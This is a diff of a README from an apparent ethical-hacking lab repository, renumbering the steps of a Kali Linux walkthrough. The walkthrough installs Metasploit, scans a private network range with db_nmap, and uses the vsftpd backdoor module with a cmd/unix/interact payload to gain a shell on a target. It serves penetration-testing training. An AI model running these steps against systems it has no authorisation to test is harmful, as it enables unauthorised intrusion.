@@ -16,7 +16,6 @@ https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-L
 
 
 **(3) Run the command below to install mestasploit console**
-
 sudo apt install --reinstall metasploit-framework -y
 
 After installing metasploit, run the command below to lunch metasploit:
@@ -24,8 +23,7 @@ After installing metasploit, run the command below to lunch metasploit:
 msfconsole
 
 
-**(3)scan result to metasploit data base (DB)**
-
+**(4)scan result to metasploit data base (DB)**
 db_nmap -sV -p- 192.168.*.*
 
 The above command will import the target scanned result to metasploit database. If the above command is not connecting, no connection, it means metasploit 
@@ -35,39 +33,40 @@ sudo systemctl start postgresql
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot2.png
 
-To initialize/create or check if its has been configured, run:
-
+**(5) To initialize/create or check if its has been configured, run:**
 sudo msfdb init
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot3.png
 
-**Relunch your metasploit** 
+
+**(6) Relunch your metasploit** 
 Open a new terminal run the below command to relunch your metasploit console:
 
 msfconsole
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot4.png
 
-Then run the command below to confirm your connection. You should see "connected to msf postgresql:
 
+**(7) Then run the command below to confirm your connection. You should see "connected to msf postgresql:**
 db_status
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot5.png
 
-Then rerun the below command to import the targeted scaned result to metasploit database:
 
+**(8)Then rerun the below command to import the target scanned result to metasploit database:**
 db_nmap -sV -p- 192.168.*.*
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot6.png
 
-Note: We are using por21 ftp version vsftp as our backdoor to gain access to the targeted device/get a module. run:
+
+**(9)Note: We are using por21 ftp version vsftp as our backdoor to gain access to the targeted device/get a module. run:**
 
 search vsftpd
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot7.png
 
-From the option below on the screenshot, choose 1. run:
 
+**(10)From the option below on the screenshot, choose 1. run:**
 info 1
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot8.png
@@ -90,8 +89,7 @@ set PAYLOAD cmd/unix/interact
 run:
 show options
 
-run:
-
+**(11)run:**
 run
 
 https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot10.png
